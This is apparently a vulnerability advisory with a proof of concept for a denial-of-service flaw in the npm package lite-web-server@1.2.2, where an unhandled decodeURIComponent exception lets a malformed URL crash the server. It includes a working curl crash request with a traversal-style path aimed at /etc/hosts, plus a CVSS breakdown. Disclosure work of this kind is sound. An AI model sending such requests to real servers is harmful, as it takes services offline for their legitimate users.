Denial of Service in lite-web-server@1.2.2

 [Raw](/lirantal/637520812da06fffb91dd86d02ff6bde/raw/4dff2d351acfa1106724069ce37a1458af531db3/lite-web-server-denial-of-service.md)

[**lite-web-server-denial-of-service.md**](#file-lite-web-server-denial-of-service-md)

# Denial of Service vulnerability in lite-web-server@1.2.2

`lite-web-server` is an HTTP file server, and describes itself as `The npm package to create simple web server`.

Observation:

* Virtually zero downloads, so no considerable impact.
* It was last published 6 months ago, so can assume some level of maintenance exists.

Resources:

* Project's GitHub source code: <https://github.com/chasyumen/lite-web-server>
* Project's npm package: <https://www.npmjs.com/package/lite-web-server>

## Background on exploitation

If an attacker makes an HTTP request to a server running with `lite-web-server`
and includes control characters that the decodeURI() function is unable to parse,
then it causes `lite-web-server` to crash.

The vulnerable code is line 274 of `src/WebServer.js` which doesn't handle an
exception thrown here:

```
          var _url = decodeURIComponent(req.url).slice(1);
```

## Proof of Concept exploit

1. Install the package: `npm install --save lite-web-server@1.2.2`
2. Create a `server.js` to serve requests (see below)
3. Ensure you have a `./public` directory in the current project and have a file in there
4. Send an HTTP request which uses unicode characters outside of the ASCII scope of URLs: `curl http://10.100.102.7:3000/..%c0%2fetc%c0%2fhosts`
5. Observe the server crashes

server.js

```
var { WebServer } = require("lite-web-server");
var server = new WebServer({
  dir: "./public/"
});

server.start();
```

### Threat Intelligence

Exploit Maturity

Snyk has a proof-of-concept or detailed explanation of how to exploit this vulnerability.

Proof of conceptEPSS

The probability is the direct output of the EPSS model, and conveys an overall sense of the threat of
exploitation in the wild. The percentile measures the EPSS probability relative to all known EPSS scores.
Note: This data is updated daily, relying on the latest available EPSS model version.

## How to fix?

There is no fixed version for `lite-web-server`.

## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) when an attacker sends an HTTP request and includes control characters that the `decodeURI()` function is unable to parse.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).
* Crash - An attacker sending crafted requests that could cause the system to crash. For Example, [npm `ws` package](https://snyk.io/vuln/npm%3Aws%3A20171108)

### CVSS Scores

version 3.1
### Snyk

7.5 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is no loss of confidentiality within the impacted component.

  **None**
* Integrity (I)

  There is no loss of integrity within the impacted component.

  **None**
* Availability (A)

  There is a total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed). Alternatively, the attacker has the ability to deny some availability, but the loss of availability presents a direct, serious consequence to the impacted component (e.g., the attacker cannot disrupt existing connections, but can prevent new connections; the attacker can repeatedly exploit a vulnerability that, in each instance of a successful attack, leaks a only small amount of memory, but after repeated exploitation causes a service to become completely unavailable).
